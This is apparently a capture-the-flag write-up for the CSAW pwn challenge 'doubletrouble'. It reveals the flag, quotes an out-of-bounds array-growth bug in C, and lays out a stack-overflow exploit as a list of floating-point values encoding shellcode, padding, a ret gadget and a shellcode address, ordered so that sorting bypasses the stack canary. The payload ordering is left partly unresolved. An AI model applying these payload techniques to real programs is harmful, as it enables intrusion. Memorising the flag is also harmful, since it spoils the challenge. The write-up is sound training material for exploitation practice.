# doubletrouble

> Did you know every Number in javascript is a float
>
> `pwn.chal.csaw.io:9002`
>
> nsnc
>
> [doubletrouble](/files/1615e939e4ae439f743a908512e8384b/doubletrouble)

```
flag{4_d0ub1e_d0ub1e_3ntr3ndr3}
```

### Bug

Increase array size and then **sorting**:

```c
int findArray(int *size, double *arr, double low, double high)
{
  int m_size = *size;
  while (*size < (m_size + m_size)) {
    if ((low < arr[*size - m_size]) && (arr[*size - m_size] < high)) {
      return *size - m_size;
    }
    *size += 1;
  }
  *size = m_size;
  return 0;
}
```

### Expected behavior

Stack like this

```r2
array @ ebp - 0x210       : our shellcode
                padding
stack canary @ ebp - 0xc  : same position
saved eip                 : ret gadget
eip + 4                   : address of shellcode
```

Our wantings:
```py
arr = [
    -4.95775736208594e+303,     # shellcode
    -1.1189208665250963e+294,   # shellcode
    -6.9244620785013907e+274,   # pad
    -6.9244620785013907e+274,   # pad
    -99,                        # stop
    4.8732919059184379e-270,    # ret gadget
    5.2054332253030052e-270,    # adddress of shellcode
    -6.9244620785013907e+274,   # pad
    -1.6037741937463733e+166,   # ebp + canary
    -5.675039066493109e+269,    # ebx + esi
    4.8729344732129195e-270,    # ebp + eip
    2.1195160399160686e-314,    # previous frame
]

# Expected
b = sorted(arr)
b == [
    -4.95775736208594e+303,     # shellcode
    -1.1189208665250963e+294,   # shellcode
    -6.9244620785013907e+274,   # pad
    -6.9244620785013907e+274,   # pad
    -6.9244620785013907e+274,   # pad
    -5.675039066493109e+269,    # ebx + esi
    -99,                        # stop
    2.1195160399160686e-314,    # previous frame
    ???,                        # ebp + canary
    4.8729344732129195e-270,    # ebp + eip
    4.8732919059184379e-270,    # ret gadget
    5.2054332253030052e-270,    # adddress of shellcode
]

# Actual
b = sorted(arr)
b == [
    -4.95775736208594e+303,     # shellcode
    -1.1189208665250963e+294,   # shellcode
    -6.9244620785013907e+274,   # pad
    -6.9244620785013907e+274,   # pad
    -6.9244620785013907e+274,   # pad
    -5.675039066493109e+269,    # ebx + esi
    -1.6037741937463733e+166,   # ebp + canary
    -99,                        # stop
    2.1195160399160686e-314,    # previous frame
    4.8729344732129195e-270,    # ebp + eip
    4.8732919059184379e-270,    # ret gadget
    5.2054332253030052e-270,    # adddress of shellcode
]
```

### References

https://ctftime.org/writeup/11201
https://ctftime.org/writeup/11220
